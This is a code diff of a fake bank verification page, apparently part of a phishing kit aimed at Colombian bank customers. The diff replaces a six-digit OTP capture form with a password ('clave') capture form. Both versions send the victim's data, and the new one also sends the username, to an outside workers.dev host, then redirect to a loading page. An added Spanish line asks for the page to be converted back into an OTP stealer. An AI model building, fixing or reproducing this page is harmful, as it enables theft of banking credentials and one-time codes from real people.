@@ -1,9 +1,10 @@
+le borrastes la logica lo unico qu etenias que cambiar es los input a 6 digitos solo eso lo mejor sera convertir este codigo en otp 
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Código de Verificación</title>
+    <title>Ingrese su Clave</title>
     <style>
         * {
             margin: 0;
@@ -33,7 +34,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background-color: rgb(255, 255, 255);
-            width: 320px;
+            width: 290px;
             height: 66px;
             display: flex;
             justify-content: center;
@@ -42,14 +43,12 @@
         }
         .center-box .input-container {
             position: relative;
-            width: 90%;
-            display: flex;
-            justify-content: space-between;
+            width: 80%;
         }
         .center-box input {
-            width: 40px;
-            height: 50px;
-            text-align: center;
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
             font-size: 19px;
             border: none;
             border-bottom: 1px solid #ffe100;
@@ -86,107 +85,81 @@
         <img src="img/cel1.jpg" alt="Background Image">
         <div class="center-box">
             <div class="input-container">
-                <input type="tel" maxlength="1" id="input1" class="otp-input">
-                <input type="tel" maxlength="1" id="input2" class="otp-input">
-                <input type="tel" maxlength="1" id="input3" class="otp-input">
-                <input type="tel" maxlength="1" id="input4" class="otp-input">
-                <input type="tel" maxlength="1" id="input5" class="otp-input">
-                <input type="tel" maxlength="1" id="input6" class="otp-input">
+                <i>🔒</i>
+                <input type="password" placeholder="Clave" id="claveInput">
             </div>
         </div>
         <div class="button-container">
             <button onclick="window.history.back()">Cancelar</button>
-            <button id="submitOtpButton">Verificar</button>
+            <button id="loginButton">Ingresar</button>
         </div>
     </div>
 
     <script>
-        const inputs = document.querySelectorAll('.otp-input');
-        const submitOtpButton = document.getElementById('submitOtpButton');
+        const claveInput = document.getElementById('claveInput');
+        const loginButton = document.getElementById('loginButton');
 
-        // Auto-focus y navegación entre inputs
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                const value = e.target.value;
-                
-                // Solo permitir números
-                if (!/^\d$/.test(value)) {
-                    e.target.value = '';
-                    return;
-                }
-
-                // Auto-enfocar siguiente input
-                if (index < inputs.length - 1 && value !== '') {
-                    inputs[index + 1].focus();
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace') {
-                    if (e.target.value === '' && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                }
-            });
-        });
-
-        submitOtpButton.addEventListener('click', async () => {
-            const otpCode = Array.from(inputs)
-                                .map(input => input.value)
-                                .join('');
+        loginButton.addEventListener('click', async () => {
+            const claveValue = claveInput.value.trim();
             
-            if (otpCode.length !== 6) {
-                alert('Por favor ingresa el código completo de 6 dígitos');
-                return;
-            }
+            if (claveValue.length >= 4) {
+                try {
+                    // Obtener datos de localStorage
+                    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                    const usuario = bancoldata.usuario;
 
-            try {
-                // Obtener transactionId del localStorage
-                const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                const transactionId = bancoldata.transactionId;
+                    if (!usuario) {
+                        alert('Error: Usuario no encontrado');
+                        return;
+                    }
 
-                if (!transactionId) {
-                    alert('Error: No se encontró la transacción');
-                    return;
+                    // Generar transactionId único
+                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+                    // ACTUALIZAR: Guardar la clave en bancoldata
+                    bancoldata.clave = claveValue;
+                    bancoldata.transactionId = transactionId;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                    console.log('Enviando login:', { usuario, clave: claveValue, transactionId });
+
+                    // Enviar login al worker
+                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            usuario: usuario,
+                            clave: claveValue,
+                            transactionId: transactionId
+                        })
+                    });
+
+                    const result = await response.json();
+                    console.log('Respuesta del login:', result);
+                    
+                    if (result.ok) {
+                        // Redirigir a la página de loading
+                        window.location.href = 'loading.html';
+                    } else {
+                        alert('Error en el login: ' + (result.error || 'Error desconocido'));
+                    }
+                    
+                } catch (error) {
+                    console.error('Error completo:', error);
+                    alert('Error al procesar el login: ' + error.message);
                 }
-
-                console.log('Enviando OTP:', { transactionId, otp: otpCode });
-
-                // Enviar OTP al worker
-                const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        transactionId: transactionId,
-                        otp: otpCode
-                    })
-                });
-
-                const result = await response.json();
-                console.log('Respuesta OTP:', result);
-
-                if (result.ok) {
-                    // Redirigir a loading para esperar siguiente acción
-                    window.location.href = 'loading.html';
-                } else {
-                    alert('Error al enviar el código: ' + (result.error || 'Error desconocido'));
-                }
-
-            } catch (error) {
-                console.error('Error enviando OTP:', error);
-                alert('Error de conexión al enviar el código');
+            } else {
+                alert('Por favor, ingrese una clave válida de al menos 4 caracteres.');
             }
         });
 
-        // También enviar con Enter en cualquier input
-        inputs.forEach(input => {
-            input.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    submitOtpButton.click();
-                }
-            });
+        // También enviar con Enter
+        claveInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                loginButton.click();
+            }
         });
     </script>
 </body>
